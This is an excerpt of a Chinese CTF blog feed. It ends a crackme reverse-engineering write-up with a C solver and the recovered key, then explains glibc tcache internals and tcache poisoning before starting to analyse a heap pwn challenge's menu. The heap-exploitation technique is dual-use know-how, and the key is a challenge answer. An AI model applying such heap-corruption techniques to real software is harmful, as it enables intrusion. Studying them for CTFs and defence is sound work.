<pre class=" language-c"><code class="language-c">param_1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">}</span>
</code></pre>
<p>接着回带到上一函数</p>
<p>关键位置</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">58</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">47</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x57</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">91</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x1d</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">FUN_004017b0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回错误</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
</code></pre>
<p>已知最后获得的字符串 local_78 已知判断条件 可以求出原字符串</p>
<p>因为获得的字符串最后进行减数操作 所以求原函数只需要将判断条件的值减取相应判断条件里的减去的值并将判断条件里的值由减改为加即可。</p>
<p>re1.c</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//得到的local_78</span>
   <span class="token keyword">int</span> local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">35</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        local_10 <span class="token operator">=</span> local_10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>所以可以逆向求出应该输入的字符串</p>
<p>exp.c</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//  main.c</span>
<span class="token comment" spellcheck="true">//  re1</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//  Created by ios on 2019/3/10.</span>
<span class="token comment" spellcheck="true">//  Copyright © 2019 ios. All rights reserved.</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"KanXueCTF2019JustForhappy"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> b<span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
   <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> d<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>d<span class="token operator">&lt;</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>a<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                c<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
               <span class="token comment" spellcheck="true">//printf("%d,",c[d]);</span>
                d<span class="token operator">=</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">//break ;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>



<span class="token comment" spellcheck="true">//int Str[25]={19,0,27,59,44,4,11,55,14,30,28,29,37,18,44,42,43,14,38,41,7,0,39,39,48};</span>
   <span class="token keyword">int</span> local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">35</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        local_10 <span class="token operator">=</span> local_10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token punctuation">}</span>
</code></pre>
<p>成功拿到key</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">j0rXI4bTeustBiIGHeCF70DDM
</code></pre>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>这里如果不好理解的可以对照IDA理解源码，并且使用动态调试 在strcmp处下断</p>
<p>图一</p>
<p> 任意输入字符例如 A  达到断点处会得到</p>
<p>图二</p>
<p> 通过两次处理后的结果为8 ，因为第二次做的处理为从数组出取元素 所以通过结果得到 param_1 的值</p>
<p>逆推到第一次处理 运算得到第一位应输入字符 </p>
<p>这样可以帮助理解（动态调试大法好～）</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;第一题-流浪者&quot;&gt;&lt;a href=&quot;#第一题-流浪者&quot; class=&quot;headerlink&quot; title=&quot;第一题 流浪者&quot;&gt;&lt;/a&gt;第一题 流浪者&lt;/h3&gt;&lt;p&gt;下载到程序 简单执行下 就是简单的creakerme ，需要输入正确验证码。&lt;/p&gt;
&lt;p&gt;载入 g
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tcache学习-god-the-reum</title>
    <link href="http://iosmosis.github.io/2019/03/04/Tcache%E5%AD%A6%E4%B9%A0-god-the-reum/"/>
    <id>http://iosmosis.github.io/2019/03/04/Tcache学习-god-the-reum/</id>
    <published>2019-03-04T06:40:37.000Z</published>
    <updated>2019-03-12T13:27:23.527Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Tcache-struct"><a href="#Tcache-struct" class="headerlink" title="Tcache struct"></a>Tcache struct</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span>

<span class="token keyword">static</span> __thread tcache_perthread_struct <span class="token operator">*</span>tcache <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="Tcache-get-Tcache-put"><a href="#Tcache-get-Tcache-put" class="headerlink" title="Tcache_get/Tcache-put"></a>Tcache_get/Tcache-put</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> size_t tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//增加到链表头部</span>
  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//记录当前 bin 的 chunk数</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>tcache_put</p>
<p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p>
<p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p>
<p>tcache_get</p>
<p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p>
<p>仅仅检查了 tc_idx 并无做更多检查 可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂。</p>
<h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>通过修改 free 状态的 tcache 里面的 chunk 的 fd （其实就是 tcache_entry-&gt;next ) ，可以分配到任意地址

tache posioning 和 fastbin attack类似，而且限制更加少，不会检查size。
</code></pre><p>一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code></p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */</span>
<span class="token macro property"># <span class="token directive keyword">define</span> TCACHE_FILL_COUNT 7</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
</code></pre>
<p>具体知识点参考阅读</p>
<p>  <a href="https://www.secpulse.com/archives/71958.html" target="_blank" rel="external">https://www.secpulse.com/archives/71958.html</a></p>
<p> <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning</a></p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="### 题目分析"></a>### 题目分析</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> dword_20202C<span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">create_size</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">delete_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
       <span class="token function">print_all</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>
       <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye da."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">6u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">developer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">default</span><span class="token punctuation">:</span>
       <span class="token function">sub_11B3</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre>
<p>运行对比可以知道</p>
<p>主要有创建、储存、删除、打印、退出、以及隐藏功能 修改地址</p>
